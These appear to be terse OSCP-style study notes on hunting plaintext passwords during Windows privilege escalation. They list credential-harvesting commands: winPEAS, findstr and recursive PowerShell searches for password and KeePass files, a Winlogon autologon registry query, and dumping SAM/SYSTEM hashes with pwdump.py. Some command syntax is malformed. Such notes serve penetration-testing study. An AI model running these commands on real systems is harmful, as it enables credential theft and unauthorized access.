# Plaintext Password

• Folders Name: C Folder | Document Folder

• To find a password

• run winpeas

• check history with command

• check exe files in C or desktop etc

• \users\noman\documents\fileMonitorBackup.log

## Goldmine Password/plaintext

https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html


    findstr /si password .txt | .xml | *.ini

Registry | (IF VNC install)

    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" (autologin)

Configuration | files with winpeas

SAM |winpeas (looking for common Sam and System backups)

Attacker machine move then dcrypt with tool creddump-master

./pwdump.py SYSTEM SAM

OR

    Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue (findbackup file)

    Get-ChildItem -Path C:\xampp -Include .txt,.ini -File -Recurse -ErrorAction SilentlyContinue (check files) | type C:\xampp\passwords.txt | type C:\xampp\mysql\bin\my.ini

    Get-ChildItem -Path C:\Users\dave\ -Include .txt,.pdf,.xls,.xlsx,.doc,.docx -File -Recurse -ErrorAction SilentlyContinue (check doc txt etc)

    Get-History

    cd C:\ | pwd | dir

